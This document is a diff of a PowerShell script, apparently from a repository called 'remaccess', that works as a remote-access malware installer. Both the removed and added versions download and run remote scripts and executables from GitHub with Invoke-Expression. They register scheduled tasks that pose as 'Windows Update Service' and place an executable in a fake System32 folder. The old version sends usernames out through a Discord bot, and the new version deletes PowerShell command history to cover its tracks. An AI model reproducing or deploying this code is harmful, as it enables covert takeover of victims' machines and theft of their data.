@@ -1,11 +1,9 @@
-#This is a placeholder file name, this doesn't setup a ping.
+$localFilePath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe"
+$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-#Write-Host "Processing Your Downloaded File, Please Don't Close this window" -ForegroundColor Yellow -BackgroundColor Black
-$regPath = "HKLM:\Software\WindowsUpdateService"
-$userNames = '(' + ((Get-WmiObject -Class Win32_UserProfile | ForEach-Object { $_.LocalPath.Split('\')[-1] }) -join ', ') + ')'
-$exepath = "C:/Windows/System32/DiscordDataUpload.exe"
-$shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
-$messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
+$url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordPingBotNewAcquisitions.exe"
+$pingdaemontask = "Windows Update Service Daemon"
+$urlfortc = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1"
 
 #Exclusion additon.
 try {
@@ -16,63 +14,31 @@ try {
 }
 catch {}
 
-#Registry path creation.
-if (-not (Test-Path $regPath)) {
-  New-Item -Path $regPath -Force | Out-Null
-}
-$existingCode = (Get-ItemProperty -Path $regPath).Code
-if ($existingCode -match '^(6|0)\d{5}$') {
-  $code = $existingCode
-}
-else {
-  $code = "6" + (Get-Random -Minimum 10000 -Maximum 99999)
-  Set-ItemProperty -Path $regPath -Name "Code" -Value $code
-}
-if (-not (Test-Path "$regPath\Data") -or (Get-ItemProperty -Path "$regPath\Data").Data -ne "active") {
-  Set-ItemProperty -Path $regPath -Name "Data" -Value "active"
-}
-$code = (Get-ItemProperty -Path $regPath).Code
-$data = (Get-ItemProperty -Path $regPath).Data
 
-#Install WindowsUpdateService
-$scriptContent = @'
-$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
-$response = Invoke-WebRequest -Uri $url -UseBasicParsing
-if ($response.StatusCode -eq 200) {
-$scriptContent = $response.Content
-Invoke-Expression $scriptContent
-} else {}
-'@
-Remove-Item $shellscriptpath -Force -ErrorAction SilentlyContinue
-$scriptContent | Set-Content -Path $shellscriptpath -Force
-#Install Windows Service
-$updateservxml = @"
+Invoke-Expression (Invoke-WebRequest -Uri $urlfortc -UseBasicParsing).Content
+if (-not (Test-Path (Split-Path $localFilePath))) {
+  New-Item -Path (Split-Path $localFilePath) -ItemType Directory -Force | Out-Null
+}
+if (Test-Path -Path $localFilePath -PathType Leaf) {
+  Remove-Item -Path $localFilePath -Force
+} try {
+  Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
+}
+catch {}
+#Create Windows Scheduled task
+$pingdaemonxml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
-    <Date>2023-10-13T00:56:52.6271595</Date>
+    <Date>2023-10-15T12:03:06.3532289</Date>
     <Author>Microsoft\System</Author>
-    <Description>Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment.</Description>
-    <URI>\Windows Update Service</URI>
+    <URI>\Windows Update Service Daemon</URI>
   </RegistrationInfo>
   <Triggers>
     <EventTrigger>
-      <Repetition>
-        <Interval>PT5M</Interval>
-        <StopAtDurationEnd>false</StopAtDurationEnd>
-      </Repetition>
       <Enabled>true</Enabled>
       <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
-      <Delay>PT1M</Delay>
     </EventTrigger>
-    <RegistrationTrigger>
-      <Repetition>
-        <Interval>PT5M</Interval>
-        <StopAtDurationEnd>false</StopAtDurationEnd>
-      </Repetition>
-      <Enabled>true</Enabled>
-      <Delay>PT1M</Delay>
-    </RegistrationTrigger>
   </Triggers>
   <Principals>
     <Principal id="Author">
@@ -81,7 +47,7 @@ $updateservxml = @"
     </Principal>
   </Principals>
   <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
     <AllowHardTerminate>false</AllowHardTerminate>
@@ -100,36 +66,28 @@ $updateservxml = @"
     <WakeToRun>false</WakeToRun>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
     <Priority>7</Priority>
+    <RestartOnFailure>
+      <Interval>PT1M</Interval>
+      <Count>999</Count>
+    </RestartOnFailure>
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
-      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\WindowsUpdateService.ps1"</Arguments>
-      <WorkingDirectory>C:\Windows\System32</WorkingDirectory>
+      <Command>C:\Windows\System32\SecureBootUpdatesMicrosoft\WindowsUpdateServiceDaemon.exe</Command>
     </Exec>
   </Actions>
 </Task>
 "@
-# Register the task from the XML content
-$updateserv = "Windows Update Service"
-if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
-  # Task exists, so delete it
-  Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
+if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
+  Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
 }
 else {}
-Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
-Start-ScheduledTask -TaskName $updateserv
-#DataUpload
-$combineddata = """**{Online}** Scheduling successful on **$code**, w/status **$data**, System's Userset is **$userNames**."""
-Invoke-WebRequest -Uri $messageboturl -OutFile $exePath -UseBasicParsing
-Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $combineddata
-Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
-# Removal of directories
-$ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateServiceDaemon.ps1")
-foreach ($file in $ps1Files) {
-  if (Test-Path $file -PathType Leaf) {
-    Remove-Item -Path $file -Force
-  }
-  else {
+Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
+Start-ScheduledTask -TaskName $pingdaemontask
+#CleanUP
+if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
+  $files = Get-ChildItem -Path $psreadlineFolderPath
+  if ($files.Count -gt 0) {
+    Remove-Item -Path "$psreadlineFolderPath\*" -Force
   }
 }
